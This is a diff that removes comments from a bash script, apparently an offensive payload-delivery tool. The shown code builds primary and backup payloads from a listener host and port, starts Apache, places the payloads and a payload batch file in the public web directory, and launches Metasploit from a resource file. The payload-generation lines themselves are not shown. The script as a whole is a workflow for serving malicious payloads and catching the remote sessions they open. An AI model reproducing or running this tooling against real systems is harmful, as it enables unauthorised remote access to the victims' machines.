@@ -1,6 +1,4 @@
 #!/bin/bash
-
-# Function to display the banner
 display_banner() {
     echo "calling banner..."
     sleep 0.5
@@ -9,7 +7,6 @@ display_banner() {
     echo ""
 }
 
-# Function to create a payload
 create_payload() {
     local lhost=$1
     local lport=$2
@@ -24,7 +21,6 @@ create_payload() {
     fi
 }
 
-# Function to create a backup payload
 create_backup_payload() {
     local lhost=$1
     local lport=$2
@@ -38,14 +34,12 @@ create_backup_payload() {
     fi
 }
 
-# Function to handle Apache server
 handle_apache() {
     echo "Starting Apache server..."
     sudo systemctl start apache2
     sudo systemctl restart apache2.service
 }
 
-# Function to move files to web server directory
 move_files() {
     local name=$1
     local backup=$2
@@ -55,7 +49,6 @@ move_files() {
     mv $backup.sh /var/www/html/
 }
 
-# Function to create payload batch file
 create_payload_batch() {
     local lhost=$1
     local name=$2
@@ -66,7 +59,6 @@ create_payload_batch() {
     sudo mv $payload.bat /var/www/html/
 }
 
-# Function to start Metasploit
 start_metasploit() {
     local lhost=$1
     local name=$2
@@ -75,7 +67,6 @@ start_metasploit() {
  msfconsole -r $name.rc
 }
 
-# Main function
 main() {
     display_banner
 
